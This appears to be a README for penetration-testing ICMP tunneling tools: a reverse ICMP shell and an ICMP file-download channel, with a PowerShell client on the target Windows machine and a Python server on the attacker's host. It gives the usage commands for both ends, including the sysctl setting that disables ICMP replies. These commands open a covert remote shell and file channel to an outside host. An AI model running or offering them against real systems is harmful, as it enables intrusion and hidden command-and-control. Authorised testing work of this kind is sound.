# Tunneling
ICMP tunneling to use during penetration testing

# ICMP Shell tunneling

## Description 

icmp_shell is a simple reverse ICMP shell with a windows client and a POSIX compatible server

The client runs on the target Windows machine, it is written in powershell by [samratashok](https://github.com/samratashok/nishang) and the server can run on any platform on the attacker machine. It has been ported to Python by [inquish](https://github.com/inquisb/icmpsh)

## Usage

###Running the server

When running the server, don't forget to disable ICMP replies by the OS. For example:

`sysctl -w net.ipv4.icmp_echo_ignore_all=1`

Then simply do :

`/icmpsh_shell_serv.py <source IP address> <destination IP address>`

###Running the client

`Invoke-PowerShellIcmp -IPAddress <destination IP address>`


# ICMP Download tunneling

## Description 

icmp_download is a simple reverse ICMP download with a windows client and a POSIX compatible server. It allows you to download file using ICMP from your server to the windows client

The client runs on the target Windows machine and the server can run on any platform on the attacker machine.

## Usage

###Running the server

Again, don't forget to disable ICMP replies by the OS. For example:

`sysctl -w net.ipv4.icmp_echo_ignore_all=1`

Then simply do :

`/icmpsh_shell_serv.py <source IP address> <destination IP address>`

###Running the client

`Icmp_Download -IPAddress <destination IP address> -filename <filename>`
